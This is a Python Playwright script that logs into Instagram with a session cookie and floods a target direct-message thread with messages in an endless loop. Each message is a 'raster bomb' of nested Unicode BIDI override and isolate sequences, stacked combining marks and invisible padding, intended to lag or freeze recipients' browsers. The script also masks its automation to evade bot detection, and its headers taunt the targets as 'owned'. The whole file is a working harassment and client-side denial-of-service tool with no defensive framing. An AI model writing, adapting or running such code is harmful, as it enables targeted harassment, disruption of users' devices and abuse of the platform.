# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (FINAL-IMPACT)
# 📅 STATUS: MAIN-THREAD-LOCK | 2-MPS | RASTER-THRASH

import os, asyncio, random, sys
from playwright.async_api import async_playwright

# --- MAXIMUM AGGRESSION ---
STRIKE_LIMIT = 8  # Refresh very frequently to keep the bot's memory fresh
# -------------------------

def get_kernel_stop_payload():
    """Generates a nested BIDI-isolation block to force GPU-Rasterization lag."""
    u_id = random.randint(1000, 9999)
    glue = "\u2060" # Word Joiner (No spaces allowed)
    
    # 💥 THE HEADER
    header = f"👑_𝕻𝕽𝕬𝖁𝕰𝕰𝕽_𝕻𝕬𝕻𝕬_👑{glue}☣️_TEAM_DEVEL_OWNED_☣️{glue}🆔_{u_id}{glue}"
    
    # 🏗️ THE 'RASTER-BOMB'
    # We use \u202E (BIDI Override) nested inside \u2067 (BIDI Isolate)
    # This is the most computationally expensive sequence in modern browsers.
    z_tower = "̸" * 190 
    void_fill = "\u2800" * 40 # Massive invisible layout width
    
    body_elements = []
    for i in range(150):
        # Nested Inversion: BIDI Isolate + BIDI Override + BIDI Pop
        # Forces the renderer to open and close new layout contexts 150 times per message.
        nested_bidi = f"\u2067\u202E𝕻𝕬𝕻𝕬_𝕺𝖂𝕹𝕾_{void_fill}{z_tower}\u202C\u2069"
        body_elements.append(nested_bidi)
        
    return (header + glue.join(body_elements))[:9995]

async def agent_blitz(target_id, cookie):
    async with async_playwright() as p:
        browser = await p.chromium.launch(
            headless=True, 
            args=[
                "--disable-blink-features=AutomationControlled",
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--disable-dev-shm-usage",
                "--js-flags='--max-old-space-size=4096'" # Boosts the bot's RAM capacity
            ]
        )
        context = await browser.new_context(
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        )
        
        await context.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        await context.add_cookies([{"name": "sessionid", "value": cookie, "domain": ".instagram.com", "path": "/", "secure": True}])
        
        page = await context.new_page()
        strike_count = 0

        async def sync_chat():
            print(f"📡 [FINAL-IMPACT] Syncing Raster-Socket...")
            await page.goto(f"https://www.instagram.com/direct/t/{target_id}/", wait_until="domcontentloaded")
            box = page.get_by_role("textbox", name="Message")
            await box.wait_for(state="visible", timeout=60000)
            return box

        try:
            box = await sync_chat()

            while True:
                for _ in range(2):
                    payload = get_kernel_stop_payload()
                    await box.fill(payload)
                    await page.keyboard.press("Enter")
                    strike_count += 1
                    print(f"💀 [STRIKE {strike_count}] RASTER BOMB INJECTED", flush=True)
                
                await asyncio.sleep(0.5) # Reduced delay for absolute max speed

                if strike_count >= STRIKE_LIMIT:
                    print(f"🧊 [PURGE] Clearing Raster Cache...")
                    strike_count = 0
                    box = await sync_chat()

        except Exception as e:
            print(f"❌ Error: {str(e)[:100]}")
            await browser.close()

if __name__ == "__main__":
    cookie = os.environ.get("SESSION_ID", "").strip()
    target_id = os.environ.get("GROUP_URL", "").strip()
    asyncio.run(agent_blitz(target_id, cookie))
